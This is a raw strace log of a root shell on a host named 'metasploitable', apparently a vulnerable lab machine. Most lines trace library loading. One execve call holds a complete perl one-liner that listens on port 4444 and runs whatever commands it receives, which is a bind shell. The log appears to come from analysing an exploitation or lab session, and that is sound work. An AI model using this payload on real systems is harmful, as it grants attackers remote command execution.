6685  07:15:03.306532 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
6685  07:15:03.306546 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
6685  07:15:03.306635 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
6685  07:15:03.306736 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d25000
6685  07:15:03.306769 mmap2(0xb7d2e000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d2e000
6685  07:15:03.306785 close(1)          = 0
6685  07:15:03.306820 munmap(0xb7ee0000, 29913) = 0
6685  07:15:03.306836 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
6685  07:15:03.306850 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
6685  07:15:03.306862 _llseek(1, 0, [0], SEEK_CUR) = 0
6685  07:15:03.306874 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
6685  07:15:03.306890 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7ee7000
6685  07:15:03.306901 _llseek(1, 1624, [1624], SEEK_SET) = 0
6685  07:15:03.306915 munmap(0xb7ee7000, 1624) = 0
6685  07:15:03.306925 close(1)          = 0
6685  07:15:03.306953 getpgrp()         = 3831
6685  07:15:03.306963 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
6685  07:15:03.306978 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
6685  07:15:03.306994 brk(0x8101000)    = 0x8101000
6685  07:15:03.307025 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
6685  07:15:03.307040 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
6685  07:15:03.307054 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
6685  07:15:03.307094 brk(0x8102000)    = 0x8102000
6685  07:15:03.307120 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
6685  07:15:03.307138 stat64("/sbin/AB", 0xbff6b5c8) = -1 ENOENT (No such file or directory)
6685  07:15:03.307151 stat64("/bin/AB", 0xbff6b5c8) = -1 ENOENT (No such file or directory)
6685  07:15:03.307162 stat64("/usr/sbin/AB", 0xbff6b5c8) = -1 ENOENT (No such file or directory)
6685  07:15:03.307173 stat64("/usr/bin/AB", 0xbff6b5c8) = -1 ENOENT (No such file or directory)
6685  07:15:03.307191 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
6685  07:15:03.307205 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d5b6f8) = 6686
6686  07:15:03.307296 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6686  07:15:03.307313 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
6686  07:15:03.307327 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
6686  07:15:03.307339 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
6686  07:15:03.307354 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
6686  07:15:03.307370 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
6686  07:15:03.307383 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
6686  07:15:03.307438 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
6686  07:15:03.307452 --- SIGPIPE (Broken pipe) @ 0 (0) ---
6686  07:15:03.307518 exit_group(127)   = ?
6685  07:15:03.329640 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
4519  07:15:03.329741 waitpid(6685,  <unfinished ...>
6685  07:15:03.329790 <... rt_sigprocmask resumed> NULL, 8) = 0
6685  07:15:03.329830 --- SIGCHLD (Child exited) @ 0 (0) ---
6685  07:15:03.329866 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 6686
6685  07:15:03.329919 waitpid(-1, 0xbff6b248, WNOHANG) = -1 ECHILD (No child processes)
6685  07:15:03.329944 sigreturn()       = ? (mask now [])
6685  07:15:03.329979 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
6685  07:15:03.329995 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6685  07:15:03.330006 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
6685  07:15:03.330019 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
6685  07:15:03.330038 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6685  07:15:03.330050 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
6685  07:15:03.330087 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
6685  07:15:03.330107 stat64("/sbin/perl", 0xbff6b5f8) = -1 ENOENT (No such file or directory)
6685  07:15:03.330119 stat64("/bin/perl", 0xbff6b5f8) = -1 ENOENT (No such file or directory)
6685  07:15:03.330131 stat64("/usr/sbin/perl", 0xbff6b5f8) = -1 ENOENT (No such file or directory)
6685  07:15:03.330143 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
6685  07:15:03.330161 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
6685  07:15:03.330186 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
6685  07:15:03.330210 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d5b6f8) = 6687
6687  07:15:03.330299 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6687  07:15:03.330316 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
6687  07:15:03.330329 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
6687  07:15:03.330341 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
6687  07:15:03.330356 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
6687  07:15:03.330372 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
6687  07:15:03.330385 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
6687  07:15:03.330419 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
6687  07:15:03.330509 brk(0)            = 0x8153000
6687  07:15:03.330531 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6687  07:15:03.330546 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f91000
6687  07:15:03.330562 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
6687  07:15:03.330579 open("/etc/ld.so.cache", O_RDONLY) = 1
6687  07:15:03.330591 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
6687  07:15:03.330608 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f89000
6687  07:15:03.330619 close(1)          = 0
6687  07:15:03.330636 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6687  07:15:03.330651 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
6687  07:15:03.330666 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
6687  07:15:03.330803 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
6687  07:15:03.330822 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f85000
6687  07:15:03.330834 mmap2(0xb7f87000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f87000
6687  07:15:03.330850 close(1)          = 0
6687  07:15:03.330862 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6687  07:15:03.330876 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
6687  07:15:03.330890 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
6687  07:15:03.330978 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
6687  07:15:03.330995 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f60000
6687  07:15:03.331006 mmap2(0xb7f83000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7f83000
6687  07:15:03.331021 close(1)          = 0
6687  07:15:03.331033 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6687  07:15:03.331047 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
6687  07:15:03.331061 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
6687  07:15:03.331152 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
6687  07:15:03.331168 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f5f000
6687  07:15:03.331181 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f47000
6687  07:15:03.331192 mmap2(0xb7f5b000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7f5b000
6687  07:15:03.331251 mmap2(0xb7f5d000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f5d000
6687  07:15:03.331269 close(1)          = 0
6687  07:15:03.331281 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6687  07:15:03.331295 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
6687  07:15:03.331310 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
6687  07:15:03.331447 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
6687  07:15:03.331466 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7df8000
6687  07:15:03.331491 mmap2(0xb7f41000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f41000
6687  07:15:03.331506 mmap2(0xb7f44000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f44000
6687  07:15:03.331519 close(1)          = 0
6687  07:15:03.331531 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6687  07:15:03.331544 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
6687  07:15:03.331558 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, \4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
6687  07:15:03.331652 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
6687  07:15:03.331669 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dc6000
6687  07:15:03.331680 mmap2(0xb7dcf000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7dcf000
6687  07:15:03.331694 mmap2(0xb7dd1000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7dd1000
6687  07:15:03.331732 close(1)          = 0
6687  07:15:03.331770 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7dc5000
6687  07:15:03.331783 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7dc58c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
6687  07:15:03.331844 mprotect(0xb7f41000, 4096, PROT_READ) = 0
6687  07:15:03.331871 munmap(0xb7f89000, 29913) = 0
6687  07:15:03.331884 set_tid_address(0xb7dc5908) = 6687
6687  07:15:03.331893 set_robust_list(0xb7dc5910, 0xc) = 0
6687  07:15:03.331903 futex(0xbfdae240, 0x81 /* FUTEX_??? */, 1) = 0
6687  07:15:03.331917 rt_sigaction(SIGRTMIN, {0xb7f4b2c0, [], SA_SIGINFO}, NULL, 8) = 0
6687  07:15:03.331930 rt_sigaction(SIGRT_1, {0xb7f4b340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
6687  07:15:03.331943 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
6687  07:15:03.331956 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
6687  07:15:03.331975 uname({sys="Linux", node="metasploitable", ...}) = 0
6687  07:15:03.332022 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
6687  07:15:03.332067 brk(0)            = 0x8153000
6687  07:15:03.332077 brk(0x8174000)    = 0x8174000
6687  07:15:03.332121 getuid32()        = 0
6687  07:15:03.332131 geteuid32()       = 0
6687  07:15:03.332140 getgid32()        = 0
6687  07:15:03.332149 getegid32()       = 0
6687  07:15:03.332186 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7da4000
6687  07:15:03.332237 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
6687  07:15:03.332269 read(1, "\236;v\206", 4) = 4
6687  07:15:03.332282 close(1)          = 0
6687  07:15:03.332301 time(NULL)        = 1495624503
6687  07:15:03.332342 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbfdadf10) = -1 ENOENT (No such file or directory)
6687  07:15:03.332360 stat64("/usr/local/lib/site_perl/5.8.8", 0xbfdadf10) = -1 ENOENT (No such file or directory)
6687  07:15:03.332373 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbfdadf10) = -1 ENOENT (No such file or directory)
6687  07:15:03.332388 stat64("/usr/local/lib/perl/5.8.7", 0xbfdae050) = -1 ENOENT (No such file or directory)
6687  07:15:03.332401 stat64("/usr/local/share/perl/5.8.7", 0xbfdae050) = -1 ENOENT (No such file or directory)
6687  07:15:03.332414 stat64("/usr/local/lib/perl/5.8.6", 0xbfdae050) = -1 ENOENT (No such file or directory)
6687  07:15:03.332425 stat64("/usr/local/share/perl/5.8.6", 0xbfdae050) = -1 ENOENT (No such file or directory)
6687  07:15:03.332437 stat64("/usr/local/lib/perl/5.8.4", 0xbfdae050) = -1 ENOENT (No such file or directory)
6687  07:15:03.332449 stat64("/usr/local/share/perl/5.8.4", 0xbfdae050) = -1 ENOENT (No such file or directory)
6687  07:15:03.332460 stat64("/usr/local/lib/perl/5.8.3", 0xbfdae050) = -1 ENOENT (No such file or directory)
6687  07:15:03.332472 stat64("/usr/local/share/perl/5.8.3", 0xbfdae050) = -1 ENOENT (No such file or directory)
6687  07:15:03.332484 stat64("/usr/local/lib/perl/5.8.2", 0xbfdae050) = -1 ENOENT (No such file or directory)
6687  07:15:03.332495 stat64("/usr/local/share/perl/5.8.2", 0xbfdae050) = -1 ENOENT (No such file or directory)
6687  07:15:03.332507 stat64("/usr/local/lib/perl/5.8.1", 0xbfdae050) = -1 ENOENT (No such file or directory)
6687  07:15:03.332518 stat64("/usr/local/share/perl/5.8.1", 0xbfdae050) = -1 ENOENT (No such file or directory)
6687  07:15:03.332534 stat64("/usr/local/lib/perl/5.8.0", 0xbfdae050) = -1 ENOENT (No such file or directory)
6687  07:15:03.332546 stat64("/usr/local/share/perl/5.8.0", 0xbfdae050) = -1 ENOENT (No such file or directory)
6687  07:15:03.332568 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdadd48) = -1 ENOTTY (Inappropriate ioctl for device)
6687  07:15:03.332582 _llseek(0, 0, [0], SEEK_CUR) = 0
6687  07:15:03.332594 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdadd48) = -1 EBADF (Bad file descriptor)
6687  07:15:03.332605 _llseek(1, 0, 0xbfdadd90, SEEK_CUR) = -1 EBADF (Bad file descriptor)
6687  07:15:03.332615 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdadd48) = -1 EINVAL (Invalid argument)
6687  07:15:03.332626 _llseek(2, 0, 0xbfdadd90, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6687  07:15:03.332637 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
6687  07:15:03.332649 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdade08) = -1 ENOTTY (Inappropriate ioctl for device)
6687  07:15:03.332659 _llseek(1, 0, [0], SEEK_CUR) = 0
6687  07:15:03.332670 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
6687  07:15:03.332682 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
6687  07:15:03.332727 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
6687  07:15:03.332796 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
6687  07:15:03.332841 getppid()         = 6685
6687  07:15:03.332902 stat64("/etc/perl/IO.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.332916 stat64("/etc/perl/IO.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.332929 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
